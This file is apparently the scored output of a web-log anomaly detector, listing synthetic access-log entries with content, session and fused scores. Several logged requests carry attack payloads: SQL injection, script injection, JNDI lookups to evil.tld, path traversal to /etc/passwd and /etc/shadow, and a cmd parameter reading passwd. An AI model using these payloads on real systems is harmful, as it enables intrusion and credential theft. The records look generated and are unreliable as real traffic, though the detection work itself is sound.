score_content,score_session,score_fused,line
26.654773712158203,0.9334408044815063,13.794107258319855,{"remote_addr": "243.9.206.50", "time_local": "11/Jan/2025:09:04:32 -0700", "request": "DELETE /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 2827, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
30.817827224731445,3.9149696826934814,17.366398453712463,{"remote_addr": "95.113.39.69", "time_local": "11/Jan/2025:09:04:33 -0700", "request": "DELETE /search?q=%27+OR+1%3D1+-- HTTP/2", "status": 204, "body_bytes_sent": 7561, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
4.3627610206604,0.6223554015159607,2.4925582110881805,{"remote_addr": "242.29.91.173", "time_local": "11/Jan/2025:09:04:33 -0700", "request": "POST /contact HTTP/2", "status": 200, "body_bytes_sent": 13093, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
0.2811836898326874,0.6734136343002319,0.47729866206645966,{"remote_addr": "225.205.52.137", "time_local": "11/Jan/2025:09:04:34 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 14662, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
26.58814811706543,1.217334270477295,13.902741193771362,{"remote_addr": "67.58.213.36", "time_local": "11/Jan/2025:09:04:35 -0700", "request": "DELETE /server-status HTTP/2", "status": 200, "body_bytes_sent": 1076, "http_referer": "-", "http_user_agent": "dirb/2.22"}
30.895204544067383,2.1364431381225586,16.51582384109497,{"remote_addr": "244.236.200.71", "time_local": "11/Jan/2025:09:04:36 -0700", "request": "DELETE /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 12114, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
11.225464820861816,3674.47802734375,1842.851746082306,{"remote_addr": "94.120.94.164", "time_local": "11/Jan/2025:09:04:36 -0700", "request": "GET /cgi-bin/test.cgi HTTP/2", "status": 401, "body_bytes_sent": 549, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
0.2633678615093231,0.7517942786216736,0.5075810700654984,{"remote_addr": "194.50.90.35", "time_local": "11/Jan/2025:09:04:37 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 16019, "http_referer": "-", "http_user_agent": "dirb/2.22"}
7.8513898849487305,986.4134521484375,497.1324210166931,{"remote_addr": "132.226.120.130", "time_local": "11/Jan/2025:09:04:38 -0700", "request": "GET /search?q=headphones HTTP/2", "status": 304, "body_bytes_sent": 11586, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
30.98607635498047,2.393791675567627,16.689934015274048,{"remote_addr": "199.183.38.243", "time_local": "11/Jan/2025:09:04:38 -0700", "request": "DELETE /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 16228, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
76.0634994506836,2.921076536178589,39.49228799343109,{"remote_addr": "160.1.241.254", "time_local": "11/Jan/2025:09:04:38 -0700", "request": "OPTIONS /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 3388, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
33.129947662353516,991.3472900390625,512.238618850708,{"remote_addr": "204.201.126.79", "time_local": "11/Jan/2025:09:04:39 -0700", "request": "DELETE /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 304, "body_bytes_sent": 6255, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
76.04438018798828,8.142463684082031,42.093421936035156,{"remote_addr": "179.237.118.151", "time_local": "11/Jan/2025:09:04:40 -0700", "request": "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 7278, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
26.839208602905273,1.4505515098571777,14.144880056381226,{"remote_addr": "206.134.231.171", "time_local": "11/Jan/2025:09:04:41 -0700", "request": "DELETE /admin HTTP/2", "status": 200, "body_bytes_sent": 13694, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
30.953031539916992,1.509863018989563,16.231447279453278,{"remote_addr": "96.203.244.245", "time_local": "11/Jan/2025:09:04:42 -0700", "request": "DELETE /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 3216, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
75.97270965576172,3.80659556388855,39.889652609825134,{"remote_addr": "68.58.137.54", "time_local": "11/Jan/2025:09:04:43 -0700", "request": "OPTIONS /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 16305, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
42.31827163696289,3760.166015625,1901.2421436309814,{"remote_addr": "229.65.82.218", "time_local": "11/Jan/2025:09:04:44 -0700", "request": "DELETE /search?q=headphones HTTP/2", "status": 403, "body_bytes_sent": 6, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
70.52289581298828,2.9475934505462646,36.73524463176727,{"remote_addr": "95.220.252.83", "time_local": "11/Jan/2025:09:04:45 -0700", "request": "OPTIONS /.git/config HTTP/2", "status": 200, "body_bytes_sent": 15698, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
16.790876388549805,1.9581873416900635,9.374531865119934,{"remote_addr": "192.245.116.19", "time_local": "11/Jan/2025:09:04:46 -0700", "request": "PUT /search?q=%27+OR+1%3D1+-- HTTP/2", "status": 200, "body_bytes_sent": 6563, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
28.768463134765625,983.6525268554688,506.2104949951172,{"remote_addr": "11.113.72.154", "time_local": "11/Jan/2025:09:04:47 -0700", "request": "DELETE /api/products HTTP/2", "status": 304, "body_bytes_sent": 690, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
0.279348224401474,0.6224266886711121,0.45088745653629303,{"remote_addr": "77.213.46.171", "time_local": "11/Jan/2025:09:04:48 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 14030, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
0.2425214648246765,0.2471572905778885,0.2448393777012825,{"remote_addr": "236.5.112.82", "time_local": "11/Jan/2025:09:04:48 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 1888, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
106.9607925415039,4.320821285247803,55.640806913375854,{"remote_addr": "199.215.203.158", "time_local": "11/Jan/2025:09:04:48 -0700", "request": "TRACE /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 4602, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
109.0964126586914,956.4124755859375,532.7544441223145,{"remote_addr": "141.104.147.104", "time_local": "11/Jan/2025:09:04:49 -0700", "request": "TRACE /api/backup?file=../../../../etc/shadow HTTP/2", "status": 302, "body_bytes_sent": 362, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
14.872925758361816,948.0725708007812,481.47274827957153,{"remote_addr": "230.232.109.178", "time_local": "11/Jan/2025:09:04:50 -0700", "request": "PUT /admin HTTP/2", "status": 302, "body_bytes_sent": 17754, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
8.584574699401855,6.047884941101074,7.316229820251465,{"remote_addr": "141.193.176.35", "time_local": "11/Jan/2025:09:04:50 -0700", "request": "POST /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 10578, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
4.333808422088623,0.24853463470935822,2.2911715283989906,{"remote_addr": "195.95.15.43", "time_local": "11/Jan/2025:09:04:51 -0700", "request": "POST /contact HTTP/2", "status": 200, "body_bytes_sent": 4595, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
101.3176498413086,4.066653728485107,52.69215178489685,{"remote_addr": "53.190.148.224", "time_local": "11/Jan/2025:09:04:52 -0700", "request": "TRACE /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 3617, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
76.00212097167969,3.2064223289489746,39.60427165031433,{"remote_addr": "134.147.153.210", "time_local": "11/Jan/2025:09:04:53 -0700", "request": "OPTIONS /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 1183, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
11.266676902770996,2.2735390663146973,6.770107984542847,{"remote_addr": "242.211.132.20", "time_local": "11/Jan/2025:09:04:54 -0700", "request": "PUT /cgi-bin/test.cgi HTTP/2", "status": 204, "body_bytes_sent": 1310, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
2.868659496307373,2.203293561935425,2.535976529121399,{"remote_addr": "254.170.38.17", "time_local": "11/Jan/2025:09:04:54 -0700", "request": "POST /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 248, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
4.617635250091553,1.094209909439087,2.85592257976532,{"remote_addr": "169.115.70.28", "time_local": "11/Jan/2025:09:04:54 -0700", "request": "POST / HTTP/2", "status": 200, "body_bytes_sent": 15512, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
1.4701298475265503,0.5886671543121338,1.029398500919342,{"remote_addr": "29.229.102.73", "time_local": "11/Jan/2025:09:04:55 -0700", "request": "GET /server-status HTTP/2", "status": 200, "body_bytes_sent": 729, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
15.447937965393066,3750.54833984375,1882.9981389045715,{"remote_addr": "68.208.43.228", "time_local": "11/Jan/2025:09:04:56 -0700", "request": "POST /logout HTTP/2", "status": 403, "body_bytes_sent": 616, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
27.5616397857666,985.5260009765625,506.54382038116455,{"remote_addr": "98.51.102.213", "time_local": "11/Jan/2025:09:04:56 -0700", "request": "DELETE /index.html HTTP/2", "status": 304, "body_bytes_sent": 14646, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
50.553470611572266,3.4275550842285156,26.99051284790039,{"remote_addr": "194.142.1.7", "time_local": "11/Jan/2025:09:04:57 -0700", "request": "HEAD /search?q=%27+OR+1%3D1+-- HTTP/2", "status": 200, "body_bytes_sent": 15559, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
0.24976693093776703,0.23027783632278442,0.24002238363027573,{"remote_addr": "25.57.220.199", "time_local": "11/Jan/2025:09:04:58 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 5220, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
52.77052307128906,992.4728393554688,522.6216812133789,{"remote_addr": "201.182.152.162", "time_local": "11/Jan/2025:09:04:59 -0700", "request": "HEAD /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 304, "body_bytes_sent": 10869, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
11.282767295837402,0.7822294235229492,6.032498359680176,{"remote_addr": "200.72.128.164", "time_local": "11/Jan/2025:09:05:00 -0700", "request": "PUT /../../etc/passwd HTTP/2", "status": 200, "body_bytes_sent": 6160, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
16.898967742919922,1.1130962371826172,9.00603199005127,{"remote_addr": "187.99.162.110", "time_local": "11/Jan/2025:09:05:01 -0700", "request": "PUT /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 2668, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
18.948904037475586,987.8226318359375,503.38576793670654,{"remote_addr": "108.254.218.45", "time_local": "11/Jan/2025:09:05:02 -0700", "request": "PUT /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 304, "body_bytes_sent": 14706, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
5.864624500274658,5.945079803466797,5.9048521518707275,{"remote_addr": "201.97.140.251", "time_local": "11/Jan/2025:09:05:02 -0700", "request": "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 8702, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
2.3356847763061523,987.3190307617188,494.82735776901245,{"remote_addr": "200.235.160.58", "time_local": "11/Jan/2025:09:05:03 -0700", "request": "GET /assets/app.css HTTP/2", "status": 304, "body_bytes_sent": 14038, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
76.02106475830078,3.5944314002990723,39.80774807929993,{"remote_addr": "62.4.133.150", "time_local": "11/Jan/2025:09:05:04 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 16281, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
102.7492904663086,3.3226046562194824,53.03594756126404,{"remote_addr": "244.39.118.82", "time_local": "11/Jan/2025:09:05:05 -0700", "request": "TRACE /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 4174, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
27.36890983581543,948.7167358398438,488.0428228378296,{"remote_addr": "203.72.250.207", "time_local": "11/Jan/2025:09:05:05 -0700", "request": "DELETE /../../etc/passwd HTTP/2", "status": 302, "body_bytes_sent": 3492, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
0.24140988290309906,0.4476924538612366,0.3445511683821678,{"remote_addr": "153.24.142.110", "time_local": "11/Jan/2025:09:05:06 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 8922, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
0.28368517756462097,0.7233267426490784,0.5035059601068497,{"remote_addr": "125.214.230.195", "time_local": "11/Jan/2025:09:05:07 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 15544, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
46.371543884277344,1.8101376295089722,24.090840756893158,{"remote_addr": "246.10.198.240", "time_local": "11/Jan/2025:09:05:07 -0700", "request": "HEAD /api/products HTTP/2", "status": 200, "body_bytes_sent": 1391, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
76.00515747070312,3.395293712615967,39.700225591659546,{"remote_addr": "36.97.68.31", "time_local": "11/Jan/2025:09:05:08 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 10904, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
87.03404998779297,3676.36181640625,1881.6979331970215,{"remote_addr": "228.183.10.247", "time_local": "11/Jan/2025:09:05:08 -0700", "request": "OPTIONS /api/product?id=123 HTTP/2", "status": 401, "body_bytes_sent": 1321, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
38.12385559082031,3791.2314453125,1914.6776504516602,{"remote_addr": "50.223.219.223", "time_local": "11/Jan/2025:09:05:09 -0700", "request": "DELETE / HTTP/2", "status": 404, "body_bytes_sent": 342, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
50.664791107177734,2.7484564781188965,26.706623792648315,{"remote_addr": "219.41.147.148", "time_local": "11/Jan/2025:09:05:10 -0700", "request": "HEAD /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 8850, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
30.93865966796875,1.576555609703064,16.257607638835907,{"remote_addr": "139.70.29.153", "time_local": "11/Jan/2025:09:05:10 -0700", "request": "DELETE /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 5126, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
12.74312973022461,0.9527626633644104,6.84794619679451,{"remote_addr": "215.199.122.98", "time_local": "11/Jan/2025:09:05:10 -0700", "request": "PUT /contact HTTP/2", "status": 200, "body_bytes_sent": 15064, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
6.502565383911133,985.1587524414062,495.8306589126587,{"remote_addr": "95.112.233.92", "time_local": "11/Jan/2025:09:05:11 -0700", "request": "POST /login HTTP/2", "status": 304, "body_bytes_sent": 12334, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
4.38340950012207,0.47594282031059265,2.4296761602163315,{"remote_addr": "95.167.130.150", "time_local": "11/Jan/2025:09:05:12 -0700", "request": "POST /logout HTTP/2", "status": 200, "body_bytes_sent": 9765, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
3.7680258750915527,948.3065795898438,476.03730273246765,{"remote_addr": "127.168.83.86", "time_local": "11/Jan/2025:09:05:12 -0700", "request": "GET /login HTTP/2", "status": 302, "body_bytes_sent": 13432, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
5.845533847808838,5.675319671630859,5.760426759719849,{"remote_addr": "80.164.25.181", "time_local": "11/Jan/2025:09:05:12 -0700", "request": "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 3103, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
48.504539489746094,985.4490356445312,516.9767875671387,{"remote_addr": "171.74.41.136", "time_local": "11/Jan/2025:09:05:13 -0700", "request": "HEAD /dashboard HTTP/2", "status": 304, "body_bytes_sent": 16391, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
57.523887634277344,3680.514404296875,1869.0191459655762,{"remote_addr": "226.240.164.45", "time_local": "11/Jan/2025:09:05:14 -0700", "request": "HEAD /logout HTTP/2", "status": 401, "body_bytes_sent": 449, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
16.89895248413086,3749.9375,1883.4182262420654,{"remote_addr": "96.175.201.226", "time_local": "11/Jan/2025:09:05:14 -0700", "request": "GET /search?q=camera HTTP/2", "status": 403, "body_bytes_sent": 608, "http_referer": "-", "http_user_agent": "dirb/2.22"}
103.48391723632812,950.7720336914062,527.1279754638672,{"remote_addr": "239.87.196.197", "time_local": "11/Jan/2025:09:05:15 -0700", "request": "TRACE /cgi-bin/test.cgi HTTP/2", "status": 302, "body_bytes_sent": 11455, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
30.938508987426758,1.5908358097076416,16.2646723985672,{"remote_addr": "224.46.51.15", "time_local": "11/Jan/2025:09:05:16 -0700", "request": "DELETE /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 5083, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
12.710653305053711,0.7326707243919373,6.721662014722824,{"remote_addr": "28.179.90.47", "time_local": "11/Jan/2025:09:05:17 -0700", "request": "PUT /profile HTTP/2", "status": 200, "body_bytes_sent": 1056, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
3.7055647373199463,985.90380859375,494.804686665535,{"remote_addr": "184.136.203.162", "time_local": "11/Jan/2025:09:05:17 -0700", "request": "GET /profile HTTP/2", "status": 304, "body_bytes_sent": 7067, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
8.544442176818848,1.1502861976623535,4.847364187240601,{"remote_addr": "65.27.133.15", "time_local": "11/Jan/2025:09:05:18 -0700", "request": "POST /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 4572, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
12.723443031311035,3746.791748046875,1879.757595539093,{"remote_addr": "15.79.229.49", "time_local": "11/Jan/2025:09:05:19 -0700", "request": "GET /contact HTTP/2", "status": 403, "body_bytes_sent": 363, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
30.892017364501953,3.776503086090088,17.33426022529602,{"remote_addr": "8.46.238.63", "time_local": "11/Jan/2025:09:05:20 -0700", "request": "DELETE /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 200, "body_bytes_sent": 12687, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
2.286468982696533,928.09814453125,465.19230675697327,{"remote_addr": "239.63.227.208", "time_local": "11/Jan/2025:09:05:20 -0700", "request": "GET /assets/app.js HTTP/2", "status": 301, "body_bytes_sent": 2340, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
70.45709991455078,2.3966064453125,36.42685317993164,{"remote_addr": "161.135.94.227", "time_local": "11/Jan/2025:09:05:21 -0700", "request": "OPTIONS /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 2412, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
4.173709392547607,0.25845155119895935,2.2160804718732834,{"remote_addr": "235.38.58.140", "time_local": "11/Jan/2025:09:05:22 -0700", "request": "POST /server-status HTTP/2", "status": 200, "body_bytes_sent": 4173, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
1.647107720375061,0.513882040977478,1.0804948806762695,{"remote_addr": "128.105.3.52", "time_local": "11/Jan/2025:09:05:23 -0700", "request": "GET /profile HTTP/2", "status": 200, "body_bytes_sent": 12576, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
52.72563552856445,954.5386962890625,503.6321659088135,{"remote_addr": "167.233.72.38", "time_local": "11/Jan/2025:09:05:24 -0700", "request": "HEAD /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 302, "body_bytes_sent": 1242, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
14.224161148071289,3748.8642578125,1881.5442094802856,{"remote_addr": "204.66.199.225", "time_local": "11/Jan/2025:09:05:24 -0700", "request": "POST /index.html HTTP/2", "status": 403, "body_bytes_sent": 81, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
107.071044921875,4.657074928283691,55.864059925079346,{"remote_addr": "11.25.158.168", "time_local": "11/Jan/2025:09:05:25 -0700", "request": "TRACE /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 14430, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
72.56593322753906,949.5823974609375,511.0741653442383,{"remote_addr": "148.246.69.79", "time_local": "11/Jan/2025:09:05:26 -0700", "request": "OPTIONS /index.html HTTP/2", "status": 302, "body_bytes_sent": 4055, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
2.2976186275482178,946.8680419921875,474.58283030986786,{"remote_addr": "93.75.143.136", "time_local": "11/Jan/2025:09:05:27 -0700", "request": "GET /assets/app.js HTTP/2", "status": 302, "body_bytes_sent": 2101, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
75.9965591430664,3.184610366821289,39.59058475494385,{"remote_addr": "224.169.93.210", "time_local": "11/Jan/2025:09:05:28 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 8339, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
5.9619140625,7.220803737640381,6.59135890007019,{"remote_addr": "128.128.242.42", "time_local": "11/Jan/2025:09:05:29 -0700", "request": "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 17135, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
0.2900163531303406,0.1448829174041748,0.2174496352672577,{"remote_addr": "213.180.115.55", "time_local": "11/Jan/2025:09:05:30 -0700", "request": "GET /.git/config HTTP/2", "status": 200, "body_bytes_sent": 2841, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
101.5219955444336,3.541503429412842,52.53174948692322,{"remote_addr": "88.241.11.197", "time_local": "11/Jan/2025:09:05:31 -0700", "request": "TRACE /.git/config HTTP/2", "status": 200, "body_bytes_sent": 7025, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
14.867291450500488,948.3160400390625,481.5916657447815,{"remote_addr": "18.42.125.166", "time_local": "11/Jan/2025:09:05:32 -0700", "request": "PUT /about HTTP/2", "status": 302, "body_bytes_sent": 15660, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
25.4267635345459,1.327620029449463,13.37719178199768,{"remote_addr": "179.112.172.176", "time_local": "11/Jan/2025:09:05:32 -0700", "request": "DELETE /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 13260, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
71.69214630126953,2.986719846725464,37.3394330739975,{"remote_addr": "7.21.136.71", "time_local": "11/Jan/2025:09:05:33 -0700", "request": "OPTIONS /server-status HTTP/2", "status": 200, "body_bytes_sent": 17707, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
6.372201919555664,948.9257202148438,477.6489610671997,{"remote_addr": "139.206.242.159", "time_local": "11/Jan/2025:09:05:34 -0700", "request": "POST /dashboard HTTP/2", "status": 302, "body_bytes_sent": 17410, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
76.01630401611328,3.1681711673736572,39.59223759174347,{"remote_addr": "34.171.190.41", "time_local": "11/Jan/2025:09:05:35 -0700", "request": "OPTIONS /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 8585, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
